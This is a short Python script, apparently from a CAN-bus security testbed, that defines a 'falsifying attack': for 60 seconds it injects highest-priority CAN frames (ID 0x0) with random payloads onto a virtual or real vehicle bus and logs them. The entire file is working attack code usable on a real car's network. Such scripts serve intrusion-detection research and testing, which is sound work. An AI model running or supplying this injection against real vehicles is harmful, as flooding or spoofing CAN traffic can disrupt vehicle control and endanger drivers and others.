import can
import random as rand
import time


def fals_attack(can_type):
    print("Initialing Falsifying Attack")
    if can_type == "1":
        bus = can.interface.Bus(interface="socketcan", channel="vcan0", bitrate=500000)
    else:
        bus = can.interface.Bus(interface="socketcan", channel="can0", bitrate=500000)

    ids = ["aaa", "bbb", "ddd", "ccc", "yyy"]
    init_time = time.time()
    msgs = []
    while time.time() - init_time <= 60:
        try:
            rand_idx = rand.randint(0, len(ids) - 1)
            rand_num = ids[rand_idx]
            msg = can.Message(
                arbitration_id=0x0,
                data=[
                    rand.randint(0, 255),
                    rand.randint(0, 255),
                    rand.randint(0, 255),
                    rand.randint(0, 255),
                    rand.randint(0, 255),
                    rand.randint(0, 255),
                    rand.randint(0, 255),
                    rand.randint(0, 255),
                ],
                is_extended_id=False,
            )
            time.sleep(rand.randint(10, 100) / 100)
            bus.send(msg, 0.01)
            msgs.append(str(msg)+'\n')
        except can.CanOperationError:
            print("Except: CanOperationError")
        except:
            print("Unkown Error Sending Can Msg")

    f = open("fals_attack_msgs.txt", "a")
    f.writelines(msgs)
    f.close()
    print("Falsifying Attack Done")
    bus.shutdown()
